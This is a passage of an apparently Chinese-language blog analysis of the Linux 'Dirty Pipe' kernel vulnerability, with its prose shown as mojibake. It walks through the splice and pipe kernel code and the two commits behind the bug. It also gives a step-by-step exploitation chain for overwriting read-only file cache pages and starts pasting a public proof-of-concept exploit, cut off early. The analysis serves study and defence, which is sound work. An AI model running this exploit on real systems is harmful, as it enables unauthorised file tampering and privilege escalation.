class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * generic_file_splice_read - splice data from file to a pipe</span><br><span class="hljs-comment"> * @in:      file to splice from</span><br><span class="hljs-comment"> * @ppos:    position in @in</span><br><span class="hljs-comment"> * @pipe:    pipe to splice to</span><br><span class="hljs-comment"> * @len:     number of bytes to splice</span><br><span class="hljs-comment"> * @flags:   splice modifier flags</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Description:</span><br><span class="hljs-comment"> *    Will read pages from given file and fill them into a pipe. Can be</span><br><span class="hljs-comment"> *    used as long as it has more or less sane -&gt;read_iter().</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">generic_file_splice_read</span><span class="hljs-params">(struct file *in, <span class="hljs-keyword">loff_t</span> *ppos,</span></span><br><span class="hljs-params"><span class="hljs-function">                 struct pipe_inode_info *pipe, <span class="hljs-keyword">size_t</span> len,</span></span><br><span class="hljs-params"><span class="hljs-function">                 <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iov_iter</span> <span class="hljs-title">to</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kiocb</span> <span class="hljs-title">kiocb</span>;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i_head;<br>    <span class="hljs-keyword">int</span> ret;<br>    <br>    <span class="hljs-comment">// æ ¹æ® pipe ç»“æ„ä½“ï¼Œåˆ›å»º iov_iter ç»“æ„</span><br>    iov_iter_pipe(&amp;to, READ, pipe, len);<br>    i_head = to.head;<br>    <span class="hljs-comment">// åˆ›å»º kiocb ç»“æ„</span><br>    init_sync_kiocb(&amp;kiocb, in);<br>    kiocb.ki_pos = *ppos;<br>    <span class="hljs-comment">// è°ƒç”¨ call_read_iter æ‰§è¡Œå®é™…çš„æ•°æ®ä¼ è¾“æ“ä½œ ï¼ï¼ï¼</span><br>    ret = call_read_iter(in, &amp;kiocb, &amp;to);<br>    <span class="hljs-comment">// å¦‚æœæ•°æ®æ­£å¸¸ä¼ è¾“</span><br>    <span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// æ›´æ–°æ–‡ä»¶è®¿é—®æƒ…å†µ</span><br>        *ppos = kiocb.ki_pos;<br>        file_accessed(in);<br>    <span class="hljs-comment">// å¦‚æœæ•°æ®ä¼ è¾“å¤±è´¥</span><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        to.head = i_head;<br>        to.iov_offset = <span class="hljs-number">0</span>;<br>        iov_iter_advance(&amp;to, <span class="hljs-number">0</span>); <span class="hljs-comment">/* to free what was emitted */</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * callers of -&gt;splice_read() expect -EAGAIN on</span><br><span class="hljs-comment">         * &quot;can&#x27;t put anything in there&quot;, rather than -EFAULT.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (ret == -EFAULT)<br>            ret = -EAGAIN;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ä» <code>generic_file_splice_read</code> å‡½æ•°çš„ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œè¯¥å‡½æ•°æœ€ç»ˆä¼šè°ƒç”¨ <code>call_read_iter</code> å‡½æ•°æ¥åšæ•°æ®ä¼ é€’ï¼›è€Œè¯¥å‡½æ•°åˆä¼šè°ƒç”¨ç‰¹å®šäºæ–‡ä»¶ç³»ç»Ÿçš„ read_iter å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">ssize_t</span> <span class="hljs-title">call_read_iter</span><span class="hljs-params">(struct file *file, struct kiocb *kio,</span></span><br><span class="hljs-params"><span class="hljs-function">                     struct iov_iter *iter)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> file-&gt;f_op-&gt;read_iter(kio, iter);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ä» <code>ext4_file_operations</code> ä»£ç ä¸­å¯ä»¥å¾—çŸ¥ï¼Œcall_read_iter å‡½æ•°è°ƒç”¨åˆ°çš„æ˜¯ ext4_file_read_iter å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">ssize_t</span> <span class="hljs-title">ext4_file_read_iter</span><span class="hljs-params">(struct kiocb *iocb, struct iov_iter *to)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span> =</span> file_inode(iocb-&gt;ki_filp);<br>    <span class="hljs-comment">// ä¸€äº›ç®€å•çš„åˆ¤æ–­</span><br>    <span class="hljs-keyword">if</span> (unlikely(ext4_forced_shutdown(EXT4_SB(inode-&gt;i_sb))))<br>        <span class="hljs-keyword">return</span> -EIO;<br><br>    <span class="hljs-keyword">if</span> (!iov_iter_count(to))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">/* skip atime */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_FS_DAX</span><br>    <span class="hljs-keyword">if</span> (IS_DAX(inode))<br>        <span class="hljs-keyword">return</span> ext4_dax_read_iter(iocb, to);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    <span class="hljs-keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_DIRECT)<br>        <span class="hljs-keyword">return</span> ext4_dio_read_iter(iocb, to);<br>    <span class="hljs-comment">// æ²¡è®¾ç½® O_DIRECT çš„èµ°è¿™é‡Œ</span><br>    <span class="hljs-keyword">return</span> generic_file_read_iter(iocb, to);<br>&#125;<br></code></pre></div></td></tr></table></figure><blockquote><p>What is <a href="https://cateee.net/lkddb/web-lkddb/FS_DAX.html">CONFIG_FS_DAX</a> â€“ Direct Access (DAX) support found in <code>fs/Kconfig</code> </p></blockquote><p>ç„¶åè¯¥å‡½æ•°åˆè°ƒ <code>generic_file_read_iter</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * generic_file_read_iter - generic filesystem read routine</span><br><span class="hljs-comment"> * @iocb:    kernel I/O control block</span><br><span class="hljs-comment"> * @iter:    destination for the data read</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This is the &quot;read_iter()&quot; routine for all filesystems</span><br><span class="hljs-comment"> * that can use the page cache directly.</span><br><span class="hljs-comment"> * Return:</span><br><span class="hljs-comment"> * * number of bytes copied, even for partial reads</span><br><span class="hljs-comment"> * * negative error code if nothing was read</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">ssize_t</span></span><br><span class="hljs-function"><span class="hljs-title">generic_file_read_iter</span><span class="hljs-params">(struct kiocb *iocb, struct iov_iter *iter)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">size_t</span> count = iov_iter_count(iter);<br>    <span class="hljs-keyword">ssize_t</span> retval = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (!count)<br>        <span class="hljs-keyword">goto</span> out; <span class="hljs-comment">/* skip atime */</span><br><br>    <span class="hljs-keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_DIRECT) &#123;<br>        ...<br>    &#125;<br>    <span class="hljs-comment">// ç»§ç»­è°ƒç”¨</span><br>    retval = generic_file_buffered_read(iocb, iter, retval);<br>out:<br>    <span class="hljs-keyword">return</span> retval;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>æ¥ç€åˆè°ƒ <code>generic_file_buffered_read</code>å‡½æ•°ã€‚è¯¥å‡½æ•°ä»£ç é‡å¤ªå¤§ï¼Œåªç®€å•è®²è®²å…¶å¤§è‡´åŠŸèƒ½ï¼š</p><ul><li>å°è¯•åœ¨è¯¥æ–‡ä»¶å·²æœ‰çš„æ–‡ä»¶ç¼“å­˜æ˜ å°„è¡¨ä¸­æŸ¥æ‰¾å…ˆå‰å·²ç»æ˜ å°„çš„<strong>æ–‡ä»¶ç¼“å­˜</strong>é¡µ<ul><li>å¦‚æœæ²¡æ–‡ä»¶ç¼“å­˜ï¼Œåˆ™è¯»å–ç£ç›˜ä¸Šçš„æ–‡ä»¶æ•°æ®ï¼Œåˆ›å»ºæ–°çš„æ–‡ä»¶ç¼“å­˜</li><li>å¦‚æœæœ‰æ–‡ä»¶ç¼“å­˜ä½†æ˜¯ç¼“å­˜è¿‡æœŸäº†ï¼Œåˆ™æ›´æ–°è¿™ä¸ªæ–‡ä»¶ç¼“å­˜</li></ul></li><li>åˆ°äº†è¿™ä¸€æ­¥ï¼Œæ­¤æ—¶æ˜¯ä¸€å®šæœ‰æ–‡ä»¶ç¼“å­˜äº†ã€‚åˆ™è°ƒç”¨ <code>copy_page_to_iter</code> å‡½æ•°æ¥å°†æ–‡ä»¶ç¼“å­˜é¡µä¸Šçš„æ•°æ®ï¼Œæ‹·è´è¿› pipe ä¸­ã€‚</li></ul><p>è¿™ä¸ªå‡½æ•°æ­£æ˜¯æˆ‘ä»¬å…ˆå‰æ‰€ä»‹ç»è¿‡çš„ï¼Œå› æ­¤æ•´ä¸ª splice ç³»ç»Ÿè°ƒç”¨ï¼Œå°±å¯ä»¥å’Œ pipe é‚£é‡Œçš„æœªåˆå§‹åŒ–æ¼æ´ä¸²èµ·æ¥äº†ã€‚</p><h3 id="å››ã€æ¼æ´æˆå› "><a href="#å››ã€æ¼æ´æˆå› " class="headerlink" title="å››ã€æ¼æ´æˆå› "></a>å››ã€æ¼æ´æˆå› </h3><p>è¿™ä¸ªæ¼æ´å¹¶éä¸€è¹´è€Œå°±ï¼Œè€Œæ˜¯ç”±ä¸¤ä¸ª commit çš„é”™è¯¯ç›¸äº’ç»“åˆå¯¼è‡´çš„ï¼š</p><ul><li><p><a href="https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b">new iov_iter flavour: pipe-backed - linux commit 241699</a>ï¼šå¼•å…¥å­—æ®µçš„æœªåˆå§‹åŒ–æ¼æ´ã€‚ <code>push_pipe</code> å’Œ <code>copy_page_to_iter_pipe</code> ä¸¤ä¸ªå‡½æ•°åœ¨è®¾ç½® <code>pipe_buffer</code> ç»“æ„ä½“æ—¶å‡æœªåˆå§‹åŒ– flag å­—æ®µã€‚</p></li><li><p><a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">pipe: merge anon_pipe_buf*_ops - linux commit f6dd97</a>ï¼šåœ¨è¯¥ commit å‰ï¼Œå†…æ ¸é€šè¿‡æ¯”è¾ƒ <code>pipe_buf-&gt;ops</code> çš„åœ°å€æ¥åˆ¤æ–­ä¸¤å— <code>pipe_buf</code> æ˜¯å¦æ˜¯<strong>å¯åˆå¹¶</strong>çš„ã€‚<strong>è¿™ç§ç¼–ç å¹¶ä¸ä¼˜é›…</strong>ï¼Œå› ä¸ºæ— è®ºæ˜¯å¦å¯åˆå¹¶ï¼Œ<code>pipe_buf-&gt;ops</code> å®é™…æŒ‡å‘çš„å‡ ä¸ªå‡½æ•°æŒ‡é’ˆéƒ½æ˜¯åŒä¸€ä¸ªï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// fs/pipe.c</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> <span class="hljs-title">anon_pipe_buf_ops</span> =</span> &#123;<br>  .confirm = generic_pipe_buf_confirm,<br>  .release = anon_pipe_buf_release,<br>  .steal = anon_pipe_buf_steal,<br>  .get = generic_pipe_buf_get,<br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> <span class="hljs-title">anon_pipe_buf_nomerge_ops</span> =</span> &#123;<br>  .confirm = generic_pipe_buf_confirm,<br>  .release = anon_pipe_buf_release,<br>  .steal = anon_pipe_buf_steal,<br>  .get = generic_pipe_buf_get,<br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> <span class="hljs-title">packet_pipe_buf_ops</span> =</span> &#123;<br>  .confirm = generic_pipe_buf_confirm,<br>  .release = anon_pipe_buf_release,<br>  .steal = anon_pipe_buf_steal,<br>  .get = generic_pipe_buf_get,<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¹ˆ tricky çš„ä»£ç éå¸¸çš„ä¸ä¼˜é›…ï¼Œå› æ­¤åœ¨è¯¥ commit(f6dd97) ä¸­ï¼Œlinux é‡æ„äº†è¿™éƒ¨åˆ†ä»£ç ï¼Œå¯ç”¨äº†æ–°çš„ pipe buf æ ‡å¿—ï¼š<code>PIPE_BUF_FLAG_CAN_MERGE</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// include/linux/pipe_fs_i.h</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_LRU       0x01  <span class="hljs-comment">/* page is on the LRU */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_ATOMIC    0x02  <span class="hljs-comment">/* was atomically mapped */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_GIFT      0x04  <span class="hljs-comment">/* page is a gift */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_PACKET    0x08  <span class="hljs-comment">/* read() as a packet */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_CAN_MERGE 0x10  <span class="hljs-comment">/* can merge buffers */</span>     <span class="hljs-comment">// &lt;= æ–°å¼•å…¥çš„ flag</span></span><br></code></pre></div></td></tr></table></figure><p>æ•´ä¸ªé‡æ„è¿‡ç¨‹å¹¶æ²¡æœ‰é—®é¢˜ï¼Œ<strong>å”¯ä¸€å¸¦æ¥çš„å‰¯ä½œç”¨å°±æ˜¯å¼•å…¥äº†æ–°çš„ pipe buf æ ‡å¿—ï¼šPIPE_BUF_FLAG_CAN_MERGE</strong>ã€‚</p></li></ul><p>å°½ç®¡ç¬¬ä¸€ä¸ª commit å¼•å…¥äº†å­—æ®µæœªåˆå§‹åŒ–æ¼æ´ï¼Œä½†è¯¥æ¼æ´ä»ç„¶æ— æ³•é€ æˆè¾ƒå¤§çš„å½±å“ï¼Œå› ä¸º<strong>å¯é€‰çš„å‡ ä¸ª pipe buf flag ä¸­æ²¡æœ‰ä»€ä¹ˆæ˜¯å¯ä»¥åˆ©ç”¨çš„</strong>ã€‚ä½†æ˜¯å½“ç¬¬äºŒä¸ª commit å¼•å…¥äº†æ–°çš„ pipe buf flagï¼š<code>PIPE_BUF_FLAG_CAN_MERGE</code> æ—¶ï¼Œå› ä¸ºæ–°çš„ pipe_buf å¯ä»¥é€šè¿‡æœªåˆå§‹åŒ–æ¼æ´ï¼Œæ¥é‡ç”¨æ—§çš„ flagï¼Œä¾‹å¦‚ <code>PIPE_BUF_FLAG_CAN_MERGE</code>ï¼Œæ¥<strong>æ‰“ç ´ page buf çš„å®Œæ•´æ€§</strong>ï¼Œä½¿å¾—<strong>å…è®¸å¯¹é‚£äº›æœ¬ä¸è¯¥å†™å…¥çš„é¡µè¿›è¡Œå†™å…¥</strong> (ä¾‹å¦‚æœ¬ä¸è¯¥å¸¦æœ‰ PIPE_BUF_FLAG_CAN_MERGE æ ‡å¿—çš„é¡µï¼Œè¯¸å¦‚æ–‡ä»¶ç¼“å­˜é¡µç­‰ç­‰)</p><p>æ³¨æ„ï¼Œè¿™é‡Œè¯´çš„<strong>åªè¯»é¡µ</strong>ï¼Œåœ¨ pipe ä¸­<strong>å¹¶éä½¿ç”¨æƒé™æ§åˆ¶ç­‰æŠ€æœ¯æ¥ä¿è¯ä¸å†™</strong>ï¼Œè€Œæ˜¯<strong>é€šè¿‡ pipe æ‰€å®ç°çš„é€»è¾‘æ¥ä¿è¯</strong>ã€‚å› æ­¤ï¼Œå½“ pipe å®ç°çš„é€»è¾‘å‡ºç°äº†é—®é¢˜ï¼Œé‚£ä¹ˆ pipe å°±å¯ä»¥å°è¯•å†™å…¥åªè¯»é¡µï¼Œè¿›è€Œè¾¾åˆ°ä»»æ„æ–‡ä»¶å†™çš„ç›®çš„ã€‚</p><h3 id="äº”ã€æ¼æ´åˆ©ç”¨"><a href="#äº”ã€æ¼æ´åˆ©ç”¨" class="headerlink" title="äº”ã€æ¼æ´åˆ©ç”¨"></a>äº”ã€æ¼æ´åˆ©ç”¨</h3><blockquote><p><a href="https://tryhackme.com/room/dirtypipe">tryhackme</a> </p></blockquote><p>é€šè¿‡ä¸Šé¢çš„ä»£ç åˆ†ææˆ‘ä»¬å¯ä»¥ç®€å•æ¨æ–­å‡ºè¿™æ ·çš„ä¸€æ¡æ¼æ´åˆ©ç”¨é“¾ï¼š</p><ol><li><p>åˆ›å»ºç®¡é“ï¼ˆåŠ¡å¿…ä¸è¦å¸¦ä¸Š O_DIRECTï¼‰</p></li><li><p>å¾€ç®¡é“ä¸­ç›´æ¥å†™å…¥å¤§é‡æ•°æ®ï¼Œä½¿å¾— pipe ç»“æ„ä½“ä¸­æ‰€æœ‰ page buf çš„ flag å…¨éƒ¨éƒ½è®¾ç½®äº† PIPE_BUF_FLAG_CAN_MERGE æ ‡å¿—ã€‚</p></li><li><p>ä»è¯¥ç®¡é“ä¸­å°†æ•°æ®å…¨éƒ¨è¯»å–å‡ºæ¥ï¼Œé‡Šæ”¾æ‰€æœ‰ page bufã€‚</p></li><li><p>è°ƒç”¨ spliceï¼Œå°†<strong>æ•°æ®é•¿åº¦ä¸ä¸é¡µå¤§å°å¯¹é½</strong>çš„<strong>å¯è¯»</strong>æ–‡ä»¶æ•°æ®ï¼Œä¼ é€’è‡³è¯¥ç®¡é“ä¸­ã€‚è¿™æ ·åœ¨ç®¡é“çš„ head ä½ç½®ï¼ŒåŠ¿å¿…ä¼šæœ‰ä¸€ä¸ª page bufï¼Œå…¶ä¸­ <strong>page æŒ‡å‘æ–‡ä»¶ç¼“å­˜</strong>ï¼Œ<strong>flags ä¸º PIPE_BUF_FLAG_CAN_MERGE</strong>ã€‚</p><blockquote><p>å› ä¸º page buf åœ¨é‡åˆ†é…æ—¶ä¸ä¼šåˆå§‹åŒ– flagsï¼Œå› æ­¤è¿™é‡Œçš„ flags å°†ä»ç„¶ä¿ç•™ä¸º PIPE_BUF_FLAG_CAN_MERGEã€‚</p></blockquote></li><li><p>ç›´æ¥ç»§ç»­å¾€è¯¥ç®¡é“ä¸­å†™å…¥ç›®æ ‡æ•°æ®ï¼Œè¿™æ ·ç”±äº PIPE_BUF_FLAG_CAN_MERGE æ ‡å¿—ä»ç„¶å­˜åœ¨ï¼Œæ–°å†™å…¥çš„æ•°æ®å°†ä¼šç›´æ¥ä¸ page buf æ‰€æŒ‡å‘çš„æ–‡ä»¶ç¼“å­˜åˆå¹¶ã€‚</p></li><li><p>æ­¤æ—¶è®¿é—®è¯¥æ–‡ä»¶ï¼Œåˆ™å†…æ ¸ä¼šå°†è¢«ä¿®æ”¹åçš„æ–‡ä»¶ç¼“å­˜ä¸­çš„æ•°æ®è¿”å›ï¼Œè¿™æ ·ä¾¿å¯è¾¾åˆ°åœ¨å†…æ ¸å±‚é¢ä»»æ„æ–‡ä»¶å†™çš„ç›®çš„ã€‚</p></li></ol><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé€šè¿‡æ¼æ´æ¥â€œæ„å¤–â€ä¿®æ”¹æ–‡ä»¶ç¼“å­˜ï¼Œ<strong>ä¸ä¼šä½¿è¯¥æ–‡ä»¶ç¼“å­˜é‡æ–°å†™å›ç£ç›˜ä¸Š</strong>ã€‚åªæœ‰å½“å†…æ ¸çš„å…¶ä»–æ¨¡å—<strong>ä¸»åŠ¨æ”¹å†™</strong>äº†è¿™å—æ–‡ä»¶ç¼“å­˜ï¼Œä½¿å¾—è¯¥æ–‡ä»¶ç¼“å­˜<strong>å˜è„ï¼ˆdirtyï¼‰</strong>ï¼Œè¿™æ ·æ‰ä¼šæŠŠè¢«ä¿®æ”¹åçš„æ–‡ä»¶ç¼“å­˜ä¿å­˜å›ç£ç›˜ä¸Šã€‚</p><p>å†…æ ¸åˆ¤æ–­ä¸€ä¸ªæ–‡ä»¶ç¼“å­˜æ˜¯å¦ dirtyï¼Œå¹¶éåˆ¤æ–­ä¸Šé¢çš„æ•°æ®æœ‰æ— è¢«æ”¹å†™ï¼Œè€Œæ˜¯åˆ¤æ–­å…¶ dirty æ ‡å¿—ã€‚é€šè¿‡ dirty pipe æ¼æ´æ¥æ”¹å†™æ–‡ä»¶ç¼“å­˜å¹¶ä¸ä¼šå½±å“åˆ°ä¸Šé¢çš„ dirty æ ‡å¿—ã€‚</p></blockquote><p>ä»‹äº cm4all é‚£è¾¹å·²ç»ç»™å‡ºäº†éå¸¸æ¸…æ™°æ˜“æ‡‚çš„ POCï¼Œå› æ­¤è¿™é‡Œç›´æ¥è´´å‡ºå®ƒçš„ POCï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/user.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> PAGE_SIZE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PAGE_SIZE 4096</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span><br><span class="hljs-comment"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">prepare_pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> p[<span class="hljs-number">2</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (pipe(p)) <span class="hljs-built_in">abort</span>();<br><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> pipe_size = fcntl(p[<span class="hljs-number">1</span>], F_GETPIPE_SZ);<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">4096</span>];<br><br>    <span class="hljs-comment">/* fill the pipe completely; each pipe_buffer will now have</span><br><span class="hljs-comment">       the PIPE_BUF_FLAG_CAN_MERGE flag */</span><br>    <span class="hljs-keyword">for</span> (<span 